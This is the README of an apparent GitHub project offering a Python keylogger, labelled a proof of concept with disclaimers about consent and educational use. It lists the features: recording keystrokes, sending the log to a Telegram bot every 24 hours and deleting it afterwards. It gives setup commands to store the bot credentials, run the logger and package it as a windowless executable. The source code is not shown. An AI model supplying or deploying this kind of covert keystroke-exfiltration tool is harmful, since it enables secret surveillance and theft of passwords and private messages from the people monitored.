# 🔐 Keylogger PoC – Python + Telegram (For Educational Use Only)

This is a **proof-of-concept keylogger** built in Python. It logs keystrokes, saves them locally, and sends the log file to a Telegram chat at scheduled intervals (default: 24 hours).  
> ⚠️ **This tool is strictly for educational use in authorized, controlled environments. Do not use without explicit permission.**

## ⚠️ Ethical Disclaimer

> ❗ **Do not run this tool on any device without the owner's clear consent. Unauthorized surveillance is illegal and unethical. This is intended solely for educational and ethical hacking practice.**

## ✨ Features

- Logs letters, space, enter, tab, backspace  
- Saves logs to: `C:\Users\<Username>\Documents\logger.txt`  
- Sends logs to a Telegram bot every 24 hours (customizable)  
- Deletes log file after sending  
- Supports `.env` config for secure credentials  
- Compatible with `.exe` build using PyInstaller  

## 🛠️ Setup & Installation

```bash
# Clone the repository
git clone https://github.com/aayushdangol16/Keylogger.git
cd Keylogger

# Install Python dependencies
pip install -r requirements.txt

# Create .env file
echo BOT_TOKEN=your_telegram_bot_token_here > .env
echo CHAT_ID=your_chat_id_here >> .env

# Run the keylogger
python logger.py

# Optional: Build executable with PyInstaller
pyinstaller --onefile --windowed --add-data ".env;." logger.py
